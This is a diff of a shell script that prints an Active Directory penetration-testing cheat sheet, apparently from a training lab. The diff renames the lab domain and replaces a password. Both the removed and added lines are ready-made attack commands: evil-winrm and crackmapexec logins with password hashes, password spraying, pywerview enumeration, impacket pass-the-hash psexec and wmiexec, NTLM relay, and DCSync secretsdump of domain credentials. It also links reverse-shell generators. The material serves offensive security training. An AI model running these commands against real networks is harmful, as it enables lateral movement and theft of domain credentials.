@@ -43,12 +43,12 @@ cat <<END
 ################################################
     Online Tools
 ################################################
+https://exploit-me.com/
 https://www.revshells.com/
 https://raikia.com/tool-powershell-encoder/
 https://www.jackson-t.ca/runtime-exec-payloads.html
 https://lolbas-project.github.io/
 https://gtfobins.github.io/
-https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/
 https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a  (Kerberos)
 
 # Color the text
@@ -194,8 +194,8 @@ crackmapexec
 
 Invoke-Command -ComputerName dc02.dev.final.com -ScriptBlock {type C:\\Users\\Administrator\\Desktop\\proof.txt}
 
-evil-winrm -i 192.168.57.121 -u 'infinity\ted' -p 'fdsfYRTYd455dD'
-evil-winrm -i 192.168.57.121 -u 'infinity\ted' -H 'e929e69f7c290222be87968263a9282e'
+evil-winrm -i 192.168.57.121 -u 'blahblah\ted' -p 'ksecurity'
+evil-winrm -i 192.168.57.121 -u 'blahblah\ted' -H 'e929e69f7c290222be87968263a9282e'
 
 ######################
 Enable RDP
@@ -273,10 +273,10 @@ Crackmap
 crackmapexec smb --kdcHost 192.168.57.5  192.168.57.0/24 --gen-relay-list relay.txt 
 
 # PSEXEC
-crackmapexec smb  192.168.57.121   -d infinity -u 'ted' -H ':e929e69f7c290222be87968263a9282e' -x 'whoami'
+crackmapexec smb  192.168.57.121   -d blahblah -u 'ted' -H ':e929e69f7c290222be87968263a9282e' -x 'whoami'
 
 # WINRM
-crackmapexec winrm 192.168.57.121   -d infinity -u 'ted' -H 'e929e69f7c290222be87968263a9282e' -x 'whoami'
+crackmapexec winrm 192.168.57.121   -d blahblah -u 'ted' -H 'e929e69f7c290222be87968263a9282e' -x 'whoami'
 
 # Password_spray
 proxychains4 -q  crackmapexec smb 172.16.57.0/24 -u 'Administrator' -d '.' -H '8388d07604009d14cbb78f7d37b9e887'
@@ -289,16 +289,16 @@ pywerview
 #  use --hashes if you dont have passwowrd.  )
 #  usefull: get-netdomaintrust, get-netgroupmember, get-netshare, get-netfileserver, get-netsubnet
 
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netdomain  -u 'ted'  -t 'dc03.infinity.com'  -p 'fdsfYRTYd455dD'
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netdomaintrust  -u 'ted'  -t 'dc03.infinity.com'  -p 'fdsfYRTYd455dD'
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'fdsfYRTYd455dD' 
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'fdsfYRTYd455dD' --unconstrained
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'fdsfYRTYd455dD' -spn '*'
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netgroup  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'fdsfYRTYd455dD' | awk 'NF' > groupts.txt
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netgroupmember  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'fdsfYRTYd455dD' --groupname PswReaders
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'fdsfYRTYd455dD' 
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'fdsfYRTYd455dD' --unconstrained
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'fdsfYRTYd455dD' --spn 
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netdomain  -u 'ted'  -t 'dc03.blahblah.com'  -p 'ksecurity'
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netdomaintrust  -u 'ted'  -t 'dc03.blahblah.com'  -p 'ksecurity'
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u 'ted' -d 'blahblah.com' -t 'dc03.blahblah.com'  -p 'ksecurity' 
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u 'ted' -d 'blahblah.com' -t 'dc03.blahblah.com'  -p 'ksecurity' --unconstrained
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u 'ted' -d 'blahblah.com' -t 'dc03.blahblah.com'  -p 'ksecurity' -spn '*'
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netgroup  -u 'ted' -d 'blahblah.com' -t 'dc03.blahblah.com'  -p 'ksecurity' | awk 'NF' > groupts.txt
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netgroupmember  -u 'ted' -d 'blahblah.com' -t 'dc03.blahblah.com'  -p 'ksecurity' --groupname PswReaders
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser -u 'ted' -d 'blahblah.com' -t 'dc03.blahblah.com'  -p 'ksecurity' 
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser -u 'ted' -d 'blahblah.com' -t 'dc03.blahblah.com'  -p 'ksecurity' --unconstrained
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser  -u 'ted' -d 'blahblah.com' -t 'dc03.blahblah.com'  -p 'ksecurity' --spn 
 
 
 # Compare Groups with the default groups and find the difff
@@ -332,11 +332,11 @@ IMPACKET
 # USE /etc/resolve.conf  #Because kerberos is  bitch.
 
 # PSEXEC (Pass the Hash)
-impacket-psexec -hashes ":e929e69f7c290222be87968263a9282e" "infinity/ted"@192.168.57.121
+impacket-psexec -hashes ":e929e69f7c290222be87968263a9282e" "blahblah/ted"@192.168.57.121
 impacket-psexec -no-pass -k  PROD.CORP1.COM/offsec@APPSRV01.PROD.CORP1.COM -dc-ip 192.168.57.70 
 
 # WMIEXEC (Pass the Hash)
-impacket-wmiexec -hashes ":e929e69f7c290222be87968263a9282e" "infinity/ted"@192.168.57.121
+impacket-wmiexec -hashes ":e929e69f7c290222be87968263a9282e" "blahblah/ted"@192.168.57.121
 
 # NTLMRELAYX (NTLMV2 RELAY)
 impacket-ntlmrelayx.py -smb2support -t 10.10.10.1 -c 'whoami /all' -debug
@@ -347,10 +347,10 @@ kirbi2ccache ticket.kirbi wow.ccache
 export KRB5CCNAME=<TGT_ccache_file>
 
 # DCSYNC
-impacket-secretsdump -just-dc  'infinity/pete@192.168.57.120' -hashes ":00f50c4047ef95b6349492e3eb0a1b41"
+impacket-secretsdump -just-dc  'blahblah/pete@192.168.57.120' -hashes ":00f50c4047ef95b6349492e3eb0a1b41"
 
 # Normal pc secrets dump
-impacket-secretsdump   'infinity/pete@192.168.57.121' -hashes ":00f50c4047ef95b6349492e3eb0a1b41"
+impacket-secretsdump   'blahblah/pete@192.168.57.121' -hashes ":00f50c4047ef95b6349492e3eb0a1b41"
 
 # Get user emails
 impacket-GetADUsers -no-pass -k  CORP1.COM/offsec -dc-ip 192.168.57.5 
@@ -838,7 +838,3 @@ callMsfScript(){
 
 # Execute the msfvenom python script
 callMsfScript $IP
-
-
-
-
